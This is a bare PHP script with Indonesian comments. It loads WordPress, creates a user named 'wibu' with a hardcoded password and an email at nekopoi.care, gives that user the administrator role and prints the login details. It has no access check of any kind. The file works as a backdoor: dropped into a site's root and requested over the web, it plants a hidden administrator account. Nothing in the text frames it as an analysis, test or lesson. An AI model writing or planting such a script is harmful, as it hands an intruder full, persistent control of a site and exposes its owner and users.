<?php
require_once('wp-load.php');

$username = 'wibu';
$password = 'wibu!';
$email    = 'admin@nekopoi.care';

// Cek apakah username sudah ada
if (username_exists($username) || email_exists($email)) {
    echo "Username atau email sudah digunakan!";
    exit;
}

// Buat akun baru
$user_id = wp_create_user($username, $password, $email);

// Set jadi admin
if (!is_wp_error($user_id)) {
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    echo "Akun admin berhasil dibuat:\n";
    echo "Username: $username\n";
    echo "Password: $password\n";
    echo "Email: $email\n";
} else {
    echo "Gagal membuat user: " . $user_id->get_error_message();
}
?>
